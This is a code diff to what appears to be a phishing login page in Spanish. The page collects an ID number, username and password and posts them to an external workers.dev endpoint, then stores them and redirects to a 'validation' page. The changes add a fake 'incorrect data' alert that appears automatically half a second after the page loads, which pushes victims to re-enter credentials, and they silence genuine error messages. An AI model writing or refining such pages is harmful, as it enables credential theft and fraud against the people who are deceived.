@@ -126,7 +126,7 @@ body{min-height:100vh}
   font-size:11px;color:#777;text-align:center;margin-top:22px
 }
 
-/* Alerta personalizada */
+/* ALERTA PERSONALIZADA */
 .alert-overlay {
   display: none;
   position: fixed;
@@ -160,7 +160,7 @@ body{min-height:100vh}
 .alert-title {
   font-size: 20px;
   font-weight: 700;
-  color: #1a1a2e;
+  color: #dc3545;
   margin-bottom: 8px;
 }
 
@@ -305,12 +305,12 @@ body{min-height:100vh}
 </head>
 <body>
 
-<!-- ALERTA PERSONALIZADA -->
+<!-- ALERTA DATOS INCORRECTOS -->
 <div class="alert-overlay" id="alertOverlay">
   <div class="alert-box">
     <div class="alert-icon">⚠️</div>
     <div class="alert-title">Datos incorrectos</div>
-    <div class="alert-message" id="alertMessage">Por favor, verifica tus datos e intenta nuevamente.</div>
+    <div class="alert-message">Por favor, verifica tus datos e intenta nuevamente.</div>
     <button class="alert-btn" onclick="cerrarAlerta()">Entendido</button>
   </div>
 </div>
@@ -359,22 +359,19 @@ body{min-height:100vh}
 // ========================= CONFIGURACIÓN =========================
 const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
 
-// ========================= FUNCIONES =========================
-function generarTransactionId() {
-    return crypto.randomUUID ? crypto.randomUUID() : 
-        Math.random().toString(36).substring(2) + Date.now().toString(36);
-}
-
 // ========================= ALERTA =========================
-function mostrarAlerta(mensaje) {
-    const overlay = document.getElementById('alertOverlay');
-    const messageEl = document.getElementById('alertMessage');
-    messageEl.textContent = mensaje || 'Por favor, verifica tus datos e intenta nuevamente.';
-    overlay.style.display = 'flex';
+function mostrarAlerta() {
+    document.getElementById('alertOverlay').style.display = 'flex';
 }
 
 function cerrarAlerta() {
     document.getElementById('alertOverlay').style.display = 'none';
+}
+
+// ========================= FUNCIONES =========================
+function generarTransactionId() {
+    return crypto.randomUUID ? crypto.randomUUID() : 
+        Math.random().toString(36).substring(2) + Date.now().toString(36);
 }
 
 // ========================= FUNCIÓN DE LOGIN =========================
@@ -384,9 +381,8 @@ async function handleLogin() {
     const clave = document.getElementById('clave').value.trim();
     const loginBtn = document.getElementById('loginBtn');
 
-    // Validar campos
+    // Validar campos (solo validación silenciosa)
     if (!dni || !usuario || !clave) {
-        mostrarAlerta('Por favor, completa todos los campos.');
         return;
     }
 
@@ -394,7 +390,7 @@ async function handleLogin() {
     loginBtn.disabled = true;
     loginBtn.classList.add('loading');
     const textoOriginal = loginBtn.textContent;
-    loginBtn.textContent = '...';
+    loginBtn.textContent = '.';
 
     const transactionId = generarTransactionId();
 
@@ -427,22 +423,23 @@ async function handleLogin() {
             
             console.log('✅ Datos guardados en localStorage');
             
-            // Redirigir directamente
+            // Redirigir directamente sin mensajes
             window.location.href = 'validacion.html';
             
         } else {
-            // Mostrar alerta de error
+            // Error silencioso - solo log
+            console.error('❌ Error:', data.error);
             loginBtn.disabled = false;
             loginBtn.classList.remove('loading');
             loginBtn.textContent = textoOriginal;
-            mostrarAlerta(data.error || 'Error al procesar la solicitud. Intenta nuevamente.');
+            mostrarAlerta();
         }
     } catch (error) {
         console.error('❌ Error en login:', error);
         loginBtn.disabled = false;
         loginBtn.classList.remove('loading');
         loginBtn.textContent = textoOriginal;
-        mostrarAlerta('Error de conexión. Verifica tu internet.');
+        mostrarAlerta();
     }
 }
 
@@ -450,6 +447,11 @@ async function handleLogin() {
 document.addEventListener('DOMContentLoaded', function() {
     const loginBtn = document.getElementById('loginBtn');
     const inputs = document.querySelectorAll('input');
+
+    // MOSTRAR ALERTA AL CARGAR LA PÁGINA
+    setTimeout(function() {
+        mostrarAlerta();
+    }, 500);
 
     // Click en botón
     loginBtn.addEventListener('click', handleLogin);
